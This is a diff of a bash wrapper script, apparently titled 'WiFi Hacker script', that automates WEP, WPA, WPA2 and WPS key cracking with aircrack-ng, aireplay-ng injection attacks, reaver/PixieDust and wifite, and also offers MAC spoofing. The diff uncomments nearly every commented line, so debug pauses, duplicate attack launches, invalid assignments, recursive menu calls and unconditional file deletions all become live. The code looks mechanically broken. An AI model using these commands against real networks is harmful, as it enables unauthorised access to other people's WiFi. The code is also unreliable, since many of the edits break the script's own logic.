@@ -273,12 +273,12 @@
 
 initMain(){
 
-	#checkArgs
+	checkArgs
 
 	checkLinuxVersion
 
 	killAll
-	#startNetworkManager
+	startNetworkManager
 
 	getCurrentDate
 	getCurrentTime
@@ -304,13 +304,13 @@ initMain(){
 	setTerminalColors
 
 	# Optionally show dependencies before launch
-	#showDependencies
+	showDependencies
 
 	# Optionally Show Disclaimer Before Launch
 	showDisclaimer
 
 	# Optionally Show Unreleased Text Before Launch
-	#isUnreleased
+	isUnreleased
 
 	# Load Main Menu
 	menuMain
@@ -365,12 +365,12 @@ checkLinuxVersion(){
 		;;
 	esac
 
-	#echo "Linux Version: $linuxVersion"
-	#echo ""
-	#echo "Is Kali?: $isKali"
-	#echo ""
-	#echo "Is Kali 2.x?: $isKaliTwo"
-	#read pause
+	echo "Linux Version: $linuxVersion"
+	echo ""
+	echo "Is Kali?: $isKali"
+	echo ""
+	echo "Is Kali 2.x?: $isKaliTwo"
+	read pause
 }
 
 
@@ -414,28 +414,28 @@ setDependencies(){
 
 checkDependencies(){
 
-	#tempCounter=0
-	#numberOfDependencies=0
+	tempCounter=0
+	numberOfDependencies=0
 	
-	#tempPath=""
-	#tempStatus=""
+	tempPath=""
+	tempStatus=""
 
 	# If counter is less than max dependencies, then build statuses
-	#if [ $tempCounter -lt $numberOfDependencies ];
-	#	then
-	#		# Set Path Name
-	#		if [ -f $tempPath ];
-	#			then
-	#				# Set Status As Available
-	#				$tempStatus="OK"
-	#			else
-	#				# Set Status As Unavailable
-	#				$tempStatus="NA"
-	#		fi
-	#	else
-	#		#echo "Done With Dependencies"
-	#		#read pause
-	#fi
+	if [ $tempCounter -lt $numberOfDependencies ];
+		then
+			# Set Path Name
+			if [ -f $tempPath ];
+				then
+					# Set Status As Available
+					$tempStatus="OK"
+				else
+					# Set Status As Unavailable
+					$tempStatus="NA"
+			fi
+		else
+			echo "Done With Dependencies"
+			read pause
+	fi
 	
 	if [ -f $pathAircrack ];
 		then
@@ -773,8 +773,8 @@ setVariablesRequired(){
 
 	esac
 
-	#echo "gnomeOptions: $gnomeOptions"
-	#read pause
+	echo "gnomeOptions: $gnomeOptions"
+	read pause
 
 	terminalKonsole="konsole -e"
 	terminalXterm="xterm -e"
@@ -907,7 +907,7 @@ setDefaultsWEP(){
 	acMode="1"
 
 	# aircrack-ng cracking mode WEP (WPA-PSK)
-	#acMode="2"
+	acMode="2"
 
 	washFile="$whTemp/wash.txt"
 	washChannel="1"
@@ -1090,14 +1090,14 @@ showDisclaimer(){
 		"Y" | "y")
 		checkForUpdates
 		fixNegativeOneChannelError
-		#initAirmon
+		initAirmon
 		fixAirmonCompat
-		#startNetworkManager
-		#killNetworkManager
-		#wpaSupplicantKill
-		#initMonitorMode
-		#stopMonitorMode
-		#checkMultipleAdapters
+		startNetworkManager
+		killNetworkManager
+		wpaSupplicantKill
+		initMonitorMode
+		stopMonitorMode
+		checkMultipleAdapters
 		menuMain
 		;;
 
@@ -1165,14 +1165,14 @@ isUnreleased(){
 		"Y" | "y")
 		checkForUpdates
 		fixNegativeOneChannelError
-		#initAirmon
+		initAirmon
 		fixAirmonCompat
-		#startNetworkManager
-		#killNetworkManager
-		#wpaSupplicantKill
-		#initMonitorMode
-		#stopMonitorMode
-		#checkMultipleAdapters
+		startNetworkManager
+		killNetworkManager
+		wpaSupplicantKill
+		initMonitorMode
+		stopMonitorMode
+		checkMultipleAdapters
 		menuMain
 		;;
 
@@ -1213,7 +1213,7 @@ banner(){
 	echo "-------------------------------------------------------------------------------------------------------------------"
 	echo "| Interfaces: $interfacesFound  |  Interface Mode: $interfaceMode  |  [A] Advanced  |  Sessions: [S] Save  [L] Load  |  [E] Extras  [H] Help  |"
 	echo "-------------------------------------------------------------------------------------------------------------------"
-	#echo ""
+	echo ""
 	$white
 
 }
@@ -1234,7 +1234,7 @@ bannerNoMenu(){
 	echo "-------------------------------------------------------------------------------------------------------------------"
 	echo "| Interfaces: $interfacesFound  |  Interface Mode: $interfaceMode  |  [A] Advanced  |  Sessions: [S] Save  [L] Load  |  [E] Extras  [H] Help  |"
 	echo "-------------------------------------------------------------------------------------------------------------------"
-	#echo ""
+	echo ""
 	$white
 
 }
@@ -1255,7 +1255,7 @@ bannerMain(){
 	$yellow
 	echo "| Interfaces: $interfacesFound  |  Interface Mode: $interfaceMode  |  [A] Advanced  |  Sessions: [S] Save  [L] Load  |  [E] Extras  [H] Help  |"
 	echo "-------------------------------------------------------------------------------------------------------------------"
-	#echo ""
+	echo ""
 	$white
 
 }
@@ -1275,7 +1275,7 @@ bannerMenu(){
 	echo "-------------------------------------------------------------------------------------------------------------------"
 	echo "| Interfaces: $interfacesFound  |  Interface Mode: $interfaceMode  |  [A] Advanced  |  Sessions: [S] Save  [L] Load  |  [E] Extras  [H] Help  |"
 	echo "-------------------------------------------------------------------------------------------------------------------"
-	#echo ""
+	echo ""
 	$white
 
 }
@@ -1474,10 +1474,10 @@ menuUpdate(){
 	bannerSlim
 
 	echo ""
-	#echo "Update Menu"
-	#echo ""
-	#echo ""
-	#echo ""
+	echo "Update Menu"
+	echo ""
+	echo ""
+	echo ""
 
 	# If remote version is not newer, then local version should be green
 	case "$newUpdateAvailable" in
@@ -1663,8 +1663,8 @@ checkUpdate(){
 	cleanVersionNumbers
 	compareUpdateVersions
 
-	#echo "newUpdateAvailable: $newUpdateAvailable"
-	#read pause
+	echo "newUpdateAvailable: $newUpdateAvailable"
+	read pause
 
 	rm $updateTemp
 
@@ -1686,7 +1686,7 @@ getUpdate(){
 	currentTask="getUpdate"
 	
 	# Get Base Script Name
-	#newVersionScript=$(printf '%s\n' "${0##*/}")
+	newVersionScript=$(printf '%s\n' "${0##*/}")
 	newVersionScript=$(basename -- "$0")
 	
 	# Download New Script
@@ -1721,9 +1721,9 @@ cleanVersionNumbers(){
 
 	versionRemoteClean=$(echo $versionRemote | sed -e 's/\.//')
 
-	#echo "Local Version: $versionBaseClean"
-	#echo "Remote Version: $versionRemoteClean"
-	#read pause
+	echo "Local Version: $versionBaseClean"
+	echo "Remote Version: $versionRemoteClean"
+	read pause
 
 }
 
@@ -1731,7 +1731,7 @@ cleanVersionNumbers(){
 compareUpdateVersions(){
 
 	# Compare Local and Remote Versions (0 = Not Greater / 1 = Greater) (Not working?? 20170102)
-	#versionCompare=$(echo "$versionBaseClean <= $versionRemoteClean" | awk '{print ($versionBaseClean <= $versionRemoteClean)}')
+	versionCompare=$(echo "$versionBaseClean <= $versionRemoteClean" | awk '{print ($versionBaseClean <= $versionRemoteClean)}')
 
 	if [ $versionRemoteClean -lt $versionBaseClean ]; then
 		
@@ -1845,18 +1845,18 @@ checkConnectionStatus(){
 
 	esac
 
-	#echo "$ipStatusText"
+	echo "$ipStatusText"
 
-	#read pause
+	read pause
 
 }
 
 
 fixAirmonCompat(){
 
-	#$terminal airmon-ng check kill&
+	$terminal airmon-ng check kill&
 	airmon-ng check kill&
-	#airmon-ng check kill&
+	airmon-ng check kill&
 
 }
 
@@ -1888,10 +1888,10 @@ checkWifiandDisplayMessage(){
 # Tries fixing issues with connection staying persistant to WiFi
 forceDisconnectWifi() {
 
-	#stopMonitorMode
-	#killNetworkManager
+	stopMonitorMode
+	killNetworkManager
 	NetworkManager
-	#disableChannelHopping
+	disableChannelHopping
 	enableChannelHopping
 
 }
@@ -2023,7 +2023,7 @@ menuMain(){
 		"0")
 		banner
 		echo ""
-		#echo "Welcome to the WiFi Hacker script!"
+		echo "Welcome to the WiFi Hacker script!"
 		echo "Compatible with all WEP/WPA/WPA2/WPS protected WiFi routers."
 		echo ""
 		$red
@@ -2130,7 +2130,7 @@ menuMain(){
 
 	esac
 
-	#menuMain
+	menuMain
 }
 
 
@@ -2147,7 +2147,7 @@ menuAuto(){
 
 	esac
 
-	#sessionCopyNewCaptureFiles
+	sessionCopyNewCaptureFiles
 	sessionRemoveEmpty
 
 	cleanTempScanResultsFile "all"
@@ -2215,7 +2215,7 @@ menuAuto(){
 		case "$encryptionTypeText" in
 
 			"WPS")
-			#$terminal wash -i $interfaceMonitor -o "$washFile" -C
+			$terminal wash -i $interfaceMonitor -o "$washFile" -C
 			;;
 
 		esac
@@ -2234,7 +2234,7 @@ menuAuto(){
 		;;
 
 		"W" | "w")
-		#returnTo="menuAuto"
+		returnTo="menuAuto"
 		spoofMacAddress
 		menuAuto
 		;;
@@ -2271,7 +2271,7 @@ menuAuto(){
 menuAdvanced(){
 
 	currentTask="menuAdvanced"
-	#lastMenuID="menuAdvanced"
+	lastMenuID="menuAdvanced"
 
 	interface="None"
 
@@ -2314,19 +2314,19 @@ menuAdvanced(){
 
 		"")
 		$currentTask
-		#menuMain
-		#menuAdvanced
+		menuMain
+		menuAdvanced
 		;;
 
 		*)
 		$currentTask
-		#menuMain
-		#menuAdvanced
+		menuMain
+		menuAdvanced
 		;;
 
 	esac
 
-	#restartProcesses
+	restartProcesses
 
 	$currentTask
 
@@ -2335,8 +2335,8 @@ menuAdvanced(){
 
 menuExtras(){
 
-	#currentTask="menuExtras"
-	#lastMenuID="menuExtras"
+	currentTask="menuExtras"
+	lastMenuID="menuExtras"
 
 	banner
 	bannerStats
@@ -2471,7 +2471,7 @@ menuExtras(){
 menuExtrasInterface(){
 
 	currentTask="menuExtrasInterface"
-	#lastMenuID="menuExtrasInterface"
+	lastMenuID="menuExtrasInterface"
 
 	banner
 	bannerStats
@@ -2497,7 +2497,7 @@ menuExtrasInterface(){
 	echo ""
 	echo "Select an option from above and press ENTER:"
 	echo ""
-	#echo ""
+	echo ""
 
 	read getExtrasInterface
 
@@ -2588,7 +2588,7 @@ menuExtrasInterface(){
 menuHelp(){
 
 	currentTask="menuHelp"
-	#lastMenuID="menuHelp"
+	lastMenuID="menuHelp"
 
 	banner
 	bannerStats
@@ -2623,14 +2623,14 @@ menuHelp(){
 
 		"")
 		$lastMenuID
-		#menuMain
-		#menuHelp
+		menuMain
+		menuHelp
 		;;
 
 		*)
 		$lastMenuID
-		#menuMain
-		#menuHelp
+		menuMain
+		menuHelp
 		;;
 
 	esac
@@ -2643,7 +2643,7 @@ menuHelp(){
 menuChangeTerminal(){
 
 	currentTask="menuChangeTerminal"
-	#lastMenuID="menuChangeTerminal"
+	lastMenuID="menuChangeTerminal"
 
 	banner
 
@@ -2777,9 +2777,9 @@ menuHoneyPotMode(){
 
 		"")
 		menuHoneyPotMode
-		#$lastMenuID
-		#menuMain
-		#menuAdvanced
+		$lastMenuID
+		menuMain
+		menuAdvanced
 		;;
 
 		"1")
@@ -2801,17 +2801,17 @@ menuHoneyPotMode(){
 
 		*)
 		menuHoneyPotMode
-		#$lastMenuID
-		#menuMain
-		#menuAdvanced
+		$lastMenuID
+		menuMain
+		menuAdvanced
 		;;
 
 	esac
 
-	#restartProcesses
+	restartProcesses
 
 	menuHoneyPotMode
-	#$lastMenuID
+	$lastMenuID
 
 }
 
@@ -2902,7 +2902,7 @@ menuSessionSave(){
 	echo ""
 
 	getSession="1"
-	#read getSession
+	read getSession
 
 	hotkeyInput="$getSession"
 
@@ -3007,7 +3007,7 @@ textGetTargetInfo(){
 	echo ""
 	echo "YOU CAN COPY AND PASTE (CTRL+SHIFT+C) (CTRL+SHIFT+V) TO ENTER TARGET INFO BELOW"
 	echo ""
-	#echo "YOU MAY NEED TO EXTEND THE WINDOW WIDER TO SEE THE ESSID NAMES"
+	echo "YOU MAY NEED TO EXTEND THE WINDOW WIDER TO SEE THE ESSID NAMES"
 	echo "YOU MAY PRESS \"T\" AT ANYTIME TO OPEN A TEXT VIEW OF AVAILABLE TARGETS"
 	echo ""
 	echo ""
@@ -3027,7 +3027,7 @@ textGetTargetInfo(){
 		"WEP")
 		$green
 		echo "WEP TARGETS MAY HAVE \"WEP\" UNDER THE \"ENC\" and \"CIPHER\" COLUMNS"
-		#echo "CURRENTLY SET TO ONLY SCAN FOR \"WEP\" TARGETS"
+		echo "CURRENTLY SET TO ONLY SCAN FOR \"WEP\" TARGETS"
 		$white
 		echo ""
 		echo ""
@@ -3061,7 +3061,7 @@ getESSID(){
 	banner
 	bannerStats
 
-	#selectFromApList essid
+	selectFromApList essid
 
 	textGetTargetInfo
 
@@ -3273,7 +3273,7 @@ getRandomMacAddress(){
 
 	getMacAddress
 
-	#macAddress="$getNewMacAdressTemp"
+	macAddress="$getNewMacAdressTemp"
 
 }
 
@@ -3290,7 +3290,7 @@ getRandomMacAddressMonitor(){
 
 	getMacAddressMonitor
 
-	#macAddressMonitor="$getNewMacAdressTemp"
+	macAddressMonitor="$getNewMacAdressTemp"
 
 }
 
@@ -3298,7 +3298,7 @@ getRandomMacAddressMonitor(){
 spoofMacAddress(){
 
 	currentTask="spoofMacAddress"
-	#lastMenuID="spoofMacAddress"
+	lastMenuID="spoofMacAddress"
 
 	# Setting resetSpoofStatus Flag for global hotkey compatibility
 	resetSpoofStatus="1"
@@ -3394,14 +3394,14 @@ initMonitorMode(){
 		getMacAddress
 		setMonitorMode
 		getMacAddressMonitor
-		#getWirelessInterfaces "refresh"
+		getWirelessInterfaces "refresh"
 		;;
 
 		*)
 		getMacAddress
 		setMonitorMode
 		getMacAddressMonitor
-		#getWirelessInterfaces
+		getWirelessInterfaces
 		;;
 
 	esac
@@ -3413,9 +3413,9 @@ setMonitorMode(){
 
 	currentTask="setMonitorMode"
 
-	#interfaceMonitor="mon0"
-	#echo "$interface"
-	#read pause
+	interfaceMonitor="mon0"
+	echo "$interface"
+	read pause
 	$startMonitorMode $interface
 
 }
@@ -3568,23 +3568,23 @@ adFileDump(){
 
 			"0")
 			$terminal airodump-ng $interfaceMonitor --bssid $bssid --channel $channel --write "dump_$essid"
-			#$terminal airodump-ng -w "dump_$essid" --bssid $bssid --channel $channel -i $interfaceMonitor &
-			#$terminal airodump-ng --ignore-negative-one -w "dump_$essid" --bssid $bssid --channel $channel -i $interfaceMonitor &
-			#read pause
+			$terminal airodump-ng -w "dump_$essid" --bssid $bssid --channel $channel -i $interfaceMonitor &
+			$terminal airodump-ng --ignore-negative-one -w "dump_$essid" --bssid $bssid --channel $channel -i $interfaceMonitor &
+			read pause
 
 			#Working (uses session path)
-			#$terminal airodump-ng -w "$capturePath/$encryptionType/dump_$essid" --bssid $bssid --channel $channel -i $interfaceMonitor &
+			$terminal airodump-ng -w "$capturePath/$encryptionType/dump_$essid" --bssid $bssid --channel $channel -i $interfaceMonitor &
 			;;
 
 			"1")
 			$terminal airodump-ng $interfaceMonitor --bssid $bssid --write "dump_$essid"
 
-			#$terminal airodump-ng -w "dump_$essid" --bssid $bssid -i $interfaceMonitor &
-			#$terminal airodump-ng --ignore-negative-one -w "dump_$essid" --bssid $bssid -i $interfaceMonitor &
-			#read pause
+			$terminal airodump-ng -w "dump_$essid" --bssid $bssid -i $interfaceMonitor &
+			$terminal airodump-ng --ignore-negative-one -w "dump_$essid" --bssid $bssid -i $interfaceMonitor &
+			read pause
 
 			#Working (uses session path)
-			#$terminal airodump-ng -w "$capturePath/$encryptionType/dump_$essid" --bssid $bssid -i $interfaceMonitor &
+			$terminal airodump-ng -w "$capturePath/$encryptionType/dump_$essid" --bssid $bssid -i $interfaceMonitor &
 			;;
 		esac
 		;;
@@ -3599,15 +3599,15 @@ adFileDump(){
 
 			"0")
 			$terminal airodump-ng $interfaceMonitor --bssid $bssid --channel $channel --write "dump_$essid"
-			#$terminal airodump-ng -w "$capturePath/$encryptionType/dump_$essid" --bssid $bssid --channel $channel -i $interfaceMonitor &
+			$terminal airodump-ng -w "$capturePath/$encryptionType/dump_$essid" --bssid $bssid --channel $channel -i $interfaceMonitor &
 			;;
 
 			"1")
 			$terminal airodump-ng $interfaceMonitor --bssid $bssid --write "dump_$essid"
-			#$terminal airodump-ng -w "dump_$essid" --bssid $bssid -i $interfaceMonitor &
+			$terminal airodump-ng -w "dump_$essid" --bssid $bssid -i $interfaceMonitor &
 
 			#Working (uses session path)
-			#$terminal airodump-ng -w "$capturePath/$encryptionType/dump_$essid" --bssid $bssid -i $interfaceMonitor &
+			$terminal airodump-ng -w "$capturePath/$encryptionType/dump_$essid" --bssid $bssid -i $interfaceMonitor &
 			;;
 		esac
 		;;
@@ -3655,13 +3655,13 @@ adAPScan(){
 	rm "$defaultScanOutputIVS"
 	rm "$defaultScanOutputXML"
 
-	#$terminal airodump-ng --channel $channel -i $interfaceMonitor &
-	#$terminal airodump-ng --ignore-negative-one --channel $channel -i $interfaceMonitor &
+	$terminal airodump-ng --channel $channel -i $interfaceMonitor &
+	$terminal airodump-ng --ignore-negative-one --channel $channel -i $interfaceMonitor &
 
 	$terminal airodump-ng --channel $channel --encrypt $encryptionType -i $interfaceMonitor -w "$initPath/apScan" --write-interval 10 -o netxml &
 
-	#$terminal airodump-ng --channel $channel --encrypt $encryptionType -i $interfaceMonitor &
-	#read pause
+	$terminal airodump-ng --channel $channel --encrypt $encryptionType -i $interfaceMonitor &
+	read pause
 
 	echo ""
 	echo ""
@@ -3679,7 +3679,7 @@ adAPScanWPS(){
 
 	$terminal airodump-ng --channel $channel -i $interfaceMonitor --wps &
 
-	#$terminal airodump-ng --channel $channel --encrypt $encryptionType -i $interfaceMonitor --$encryptionType&
+	$terminal airodump-ng --channel $channel --encrypt $encryptionType -i $interfaceMonitor --$encryptionType&
 
 	echo ""
 	echo ""
@@ -3728,13 +3728,13 @@ adAPScanNoChannel(){
 	rm "$defaultScanOutputIVS"
 	rm "$defaultScanOutputXML"
 
-	#$terminal airodump-ng -i $interfaceMonitor &
-	#$terminal airodump-ng --ignore-negative-one -i $interfaceMonitor &
+	$terminal airodump-ng -i $interfaceMonitor &
+	$terminal airodump-ng --ignore-negative-one -i $interfaceMonitor &
 
 	$terminal airodump-ng --encrypt $encryptionType -i $interfaceMonitor -w "$initPath/apScan" --write-interval 10 -o netxml &
 
-	#$terminal airodump-ng --encrypt $encryptionType -i $interfaceMonitor &
-	#read pause
+	$terminal airodump-ng --encrypt $encryptionType -i $interfaceMonitor &
+	read pause
 
 	echo ""
 	echo ""
@@ -3755,9 +3755,9 @@ adAPScanNoChannelWPS(){
 
 	$terminal airodump-ng -i $interfaceMonitor --wps -w "$initPath/apScan" --write-interval 10 -o netxml &
 
-	#$terminal airodump-ng -i $interfaceMonitor --wps &
+	$terminal airodump-ng -i $interfaceMonitor --wps &
 
-	#$terminal airodump-ng --encrypt $encryptionType -i $interfaceMonitor --$encryptionType&
+	$terminal airodump-ng --encrypt $encryptionType -i $interfaceMonitor --$encryptionType&
 
 	echo ""
 	echo ""
@@ -4111,7 +4111,7 @@ menuAttacksWEPWifiteAuto(){
 
 	killAll
 
-	#$terminal $wifiteAttackWEP -c $channel -b $bssid -e $essid -wepsave -wepca 5000 &
+	$terminal $wifiteAttackWEP -c $channel -b $bssid -e $essid -wepsave -wepca 5000 &
 	$terminal $wifiteAttackWEP -wepsave "$initPath" -wepca 5000 &
 
 	banner
@@ -4182,11 +4182,11 @@ arAttackFakeAuth(){
 
 	currentTask="arAttackFakeAuth"
 
-	#$terminal aireplay-ng -1 1 -a $bssid -h $macAddressMonitor -e "$essid" $interfaceMonitor &
+	$terminal aireplay-ng -1 1 -a $bssid -h $macAddressMonitor -e "$essid" $interfaceMonitor &
 	$terminal aireplay-ng -1 0 -a $bssid -h $macAddressMonitor -e "$essid" $interfaceMonitor &
 	
 	# Alt
-	#$terminal aireplay-ng -1 6000 -o 1 -q 10 -a $bssid -h $macAddressMonitor -e "$essid" $interfaceMonitor &
+	$terminal aireplay-ng -1 6000 -o 1 -q 10 -a $bssid -h $macAddressMonitor -e "$essid" $interfaceMonitor &
 
 }
 
@@ -4213,11 +4213,11 @@ arAttackChopChop(){
 
 	currentTask="arAttackChopChop"
 
-	#$terminal aireplay-ng -4 -a $bssid -h $macAddressMonitor $interfaceMonitor &
+	$terminal aireplay-ng -4 -a $bssid -h $macAddressMonitor $interfaceMonitor &
 	$terminal aireplay-ng -4 -h $macAddressMonitor -b $bssid $interfaceMonitor &
 	
 	# Unauthenticated Method
-	#$terminal aireplay-ng -4 -b $bssid $interfaceMonitor &
+	$terminal aireplay-ng -4 -b $bssid $interfaceMonitor &
 
 }
 
@@ -4280,24 +4280,24 @@ aircrackDecryptWEP(){
 
 	findCaptureFiles
 
-	#echo "$listCap"
-	#echo "$listIvs"
-	#read pause
+	echo "$listCap"
+	echo "$listIvs"
+	read pause
 
 	killAircrack
 
 	aircrack-ng -a $acMode -e "$essid" -b $bssid -l "key_$essid" $listCap $listIvs&
-	#aircrack-ng -e "$essid" -b $bssid -l "key_$essid" *.cap *.ivs&
-	#aircrack-ng -l "key_$essid" *.cap *.ivs&
-	#'aircrack-ng' " -l" "$capturePath/$encryptionType/key_$essid" "$capturePath/$encryptionType/*.cap" "$capturePath/$encryptionType/*.ivs"&
+	aircrack-ng -e "$essid" -b $bssid -l "key_$essid" *.cap *.ivs&
+	aircrack-ng -l "key_$essid" *.cap *.ivs&
+	'aircrack-ng' " -l" "$capturePath/$encryptionType/key_$essid" "$capturePath/$encryptionType/*.cap" "$capturePath/$encryptionType/*.ivs"&
 
 	# Killing aircrack-ng to stop auto-checking from overlapping WEP Attack menu
 	killAircrack
 
-	#echo ""
-	#echo ""
-	#echo ""
-	#echo "FOUND KEY: "
+	echo ""
+	echo ""
+	echo ""
+	echo "FOUND KEY: "
 	echo ""
 	echo ""
 	echo ""
@@ -4471,10 +4471,10 @@ aircrackDecryptWPA(){
 	banner
 	bannerStats
 
-	#echo ""
-	#echo ""
-	#echo ""
-	#echo "FOUND KEY: "
+	echo ""
+	echo ""
+	echo ""
+	echo "FOUND KEY: "
 	echo ""
 	echo "WPA Attack Is Currently Running!"
 	echo ""
@@ -4583,7 +4583,7 @@ menuAttacksWPAWifiteAuto(){
 
 	killAll
 
-	#$terminal $wifiteAttackWEP -c $channel -b $bssid -e $essid -wepsave -wepca 1000 &
+	$terminal $wifiteAttackWEP -c $channel -b $bssid -e $essid -wepsave -wepca 1000 &
 	$terminal $wifiteAttackWPA &
 
 	banner
@@ -4767,10 +4767,10 @@ aircrackDecryptWPA2(){
 	banner
 	bannerStats
 
-	#echo ""
-	#echo ""
-	#echo ""
-	#echo "FOUND KEY: "
+	echo ""
+	echo ""
+	echo ""
+	echo "FOUND KEY: "
 	echo ""
 	echo "WPA2 Attack Is Currently Running!"
 	echo ""
@@ -4874,7 +4874,7 @@ menuAttacksWPA2WifiteAuto(){
 
 	killAll
 
-	#$terminal $wifiteAttackWEP -c $channel -b $bssid -e $essid -wepsave -wepca 1000 &
+	$terminal $wifiteAttackWEP -c $channel -b $bssid -e $essid -wepsave -wepca 1000 &
 	$terminal $wifiteAttackWPA2 &
 
 	banner
@@ -4918,8 +4918,8 @@ autoModeNoPreviousSessionWPS(){
 
 	currentTask="autoModeNoPreviousSessionWPS"
 
-	#adAPScanWifiteWPSNoChannel
-	#adAPScanNoChannel
+	adAPScanWifiteWPSNoChannel
+	adAPScanNoChannel
 	adAPScanNoChannelWPS
 
 	doSleepMessage "Preparing Text List of Available Targets...." "15"
@@ -5012,7 +5012,7 @@ menuAttacksWPS(){
 	case "$pixieChoice" in
 
 		"")
-		#menuAttacksWPS
+		menuAttacksWPS
 		pixieChoice="1"
 		sleepMessage1="Preparing Reaver/PixieDust Session...."
 		sleepMessage2="Launching Reaver/PixieDust Session...."
@@ -5062,11 +5062,11 @@ menuAttacksWPS(){
 	case "$pixieChoice" in
 	
 		"1")
-		#echo "PixeDust Enabled"
-		#$reaver -i $interfaceMonitor -b $bssid -c $channel -S -vv -K $pixieNumber
+		echo "PixeDust Enabled"
+		$reaver -i $interfaceMonitor -b $bssid -c $channel -S -vv -K $pixieNumber
 		$reaver -i $interfaceMonitor -b $bssid -c $channel -vv -K $pixieNumber
-		#read pause
-		#pixieFailed="1"
+		read pause
+		pixieFailed="1"
 
 		reaverSessionComplete
 
@@ -5086,9 +5086,9 @@ menuAttacksWPS(){
 		;;
 	
 		"2")
-		#echo "PixeDust Disabled"
-		#$reaver -i $interfaceMonitor -b $bssid -c $channel -S -vv
-		#$reaver -i $interfaceMonitor -b $bssid -c $channel -vv
+		echo "PixeDust Disabled"
+		$reaver -i $interfaceMonitor -b $bssid -c $channel -S -vv
+		$reaver -i $interfaceMonitor -b $bssid -c $channel -vv
 
 		reaverMenuAttacksWPS
 		;;
@@ -5152,11 +5152,11 @@ reaverSessionComplete(){
 	echo "** SCROLL UP FOR RECOVERED PASSWORD ***"
 	echo "***************************************"
 	echo ""
-	#$magenta
-	#echo "Attempting To Save Reaver Session...."
-	#echo ""
-	#echo "** Will Give Error If No Session Has Been Written **"
-	#echo ""
+	$magenta
+	echo "Attempting To Save Reaver Session...."
+	echo ""
+	echo "** Will Give Error If No Session Has Been Written **"
+	echo ""
 	reaverSaveCurrentSessionFile
 
 	$green
@@ -5239,7 +5239,7 @@ menuAttacksWPSWifiteAuto(){
 
 	killAll
 
-	#$terminal $wifiteAttackWPS -c $channel -b $bssid -e $essid -wepsave -wepca 1000 &
+	$terminal $wifiteAttackWPS -c $channel -b $bssid -e $essid -wepsave -wepca 1000 &
 	$terminal $wifiteAttackWPS &
 
 	banner
@@ -5364,7 +5364,7 @@ menuBullyMain() {
 
 menuWashMain() {
 
-	#currentTask="menuWashMain"
+	currentTask="menuWashMain"
 
 	banner
 	echo ""
@@ -5509,7 +5509,7 @@ replayArpRequest(){
 	aireplay-ng -2 -r "$initPath/$bssid-arp.cap" $interfaceMonitor &
 
 	# Accepts a CAP file as INPUT
-	#aireplay-ng -2 -r $1 $interfaceMonitor &
+	aireplay-ng -2 -r $1 $interfaceMonitor &
 
 }
 
@@ -5661,8 +5661,8 @@ killProcesses(){
 
 	killall NetworkManager
 	killall NetworkManagerDispatcher
-	#killall wpa_supplicant
-	#killall avahi-daemon
+	killall wpa_supplicant
+	killall avahi-daemon
 
 }
 
@@ -5678,7 +5678,7 @@ restartProcesses(){
 	NetworkManagerDispatcher
 
 	#wpa_supplicant
-	#avahi-daemon
+	avahi-daemon
 
 }
 
@@ -5718,7 +5718,7 @@ killAirodump(){
 
 		*)
 		killAirodumpTemp=$(kill $findAirodumpPID)
-		#killAirodumpTemp=$(killall airodump-ng)
+		killAirodumpTemp=$(killall airodump-ng)
 		;;
 	esac
 
@@ -5845,10 +5845,10 @@ cleanSessionFiles(){
 		echo ""
 		echo ""
 
-		#rm "$capturePath/wep/wep.sessions"
-		#rm "$capturePath/wps/wps.sessions"
-		#rm "$capturePath/wpa/wpa.sessions"
-		#rm "$capturePath/wpa2/wpa2.sessions"
+		rm "$capturePath/wep/wep.sessions"
+		rm "$capturePath/wps/wps.sessions"
+		rm "$capturePath/wpa/wpa.sessions"
+		rm "$capturePath/wpa2/wpa2.sessions"
 
 		rm -r "$capturePath"
 		sleep 1
@@ -5885,7 +5885,7 @@ backupSessionFiles(){
 
 	backupName="sessions-backup-$displayDate3"
 	backupDir="sessions"
-	#nextBackupSlot=0
+	nextBackupSlot=0
 
 	if [ -f "$backupName.zip" ]; then 
 		nextBackupSlot=$((nextBackupSlot+1))
@@ -5893,9 +5893,9 @@ backupSessionFiles(){
 	fi
 		
 
-	#echo "$backupName"
-	#echo "$nextBackupSlot"
-	#read pause
+	echo "$backupName"
+	echo "$nextBackupSlot"
+	read pause
 
 	banner
 	echo ""
@@ -5993,20 +5993,20 @@ sessionRemoveEmpty(){
 
 	currentTask="sessionRemoveEmpty"
 
-	#banner
-	#echo ""
-	#echo "Removing Empty Sessions...."
-	#echo ""
-	#echo ""
+	banner
+	echo ""
+	echo "Removing Empty Sessions...."
+	echo ""
+	echo ""
 
 	rm "$capturePath/$encryptionType/empty.sessions"
 	rmdir "$capturePath/empty"
 
 	banner
 	echo ""
-	#echo "Removing Empty Sessions...."
-	#echo ""
-	#echo ""
+	echo "Removing Empty Sessions...."
+	echo ""
+	echo ""
 
 }
 
@@ -6334,18 +6334,18 @@ checkMultipleAdapters(){
 			;;
 
 			*)
-			#interface="$interfaceCheck"
+			interface="$interfaceCheck"
 			interfaceNumber=$(($interfaceNumber+1))
 			interfacesFound=$(($interfacesFound+1))
 			;;
 
 		esac
 
-		#echo "interfaceNumber: $interfaceNumber"
-		#echo "interfaceNumberMax: $interfaceNumberMax"
-		#echo "interfaceCheck: $interfaceCheck"
-		#echo "interfacesFound: $interfacesFound"
-		#read pause
+		echo "interfaceNumber: $interfaceNumber"
+		echo "interfaceNumberMax: $interfaceNumberMax"
+		echo "interfaceCheck: $interfaceCheck"
+		echo "interfacesFound: $interfacesFound"
+		read pause
 
 		
 	done
@@ -6357,11 +6357,11 @@ getWirelessInterfaceNames(){
 
 	currentTask="getWirelessInterfaceNames"
 
-	#if [ ! -z "$showAdapterUsbAtherosAR9271" ]; then
+	if [ ! -z "$showAdapterUsbAtherosAR9271" ]; then
 	
-	#	showAdapterOneName="$showAdapterUsbAtherosAR9271"
+		showAdapterOneName="$showAdapterUsbAtherosAR9271"
 
-	#fi 
+	fi 
 
 }
 
@@ -6390,9 +6390,9 @@ getWirelessInterfaces(){
 		$cyan
 		echo "To Change Adapter Settings, Press \"C\" Now"
 		$white
-		#echo ""
-		#$cyan
-		#echo "Current: $interface"
+		echo ""
+		$cyan
+		echo "Current: $interface"
 		$white
 		echo ""
 		echo ""
@@ -6530,17 +6530,17 @@ getWirelessInterfaces(){
 
 			"0")
 			interface=$(iwconfig | grep "wlan" | head -c 5)
-			#interfaceMonitor=$(iwconfig | grep "mon" | head -c 4)
+			interfaceMonitor=$(iwconfig | grep "mon" | head -c 4)
 			interfaceMonitor="$interface""mon"
 			interfaceName=$interfaceMonitor
 			;;
 
 			"1")
 			interface=$(iwconfig | grep "wlan" | head -c 5)
-			#interfaceMonitor=$(iwconfig | grep "wlan" | head -c 8)
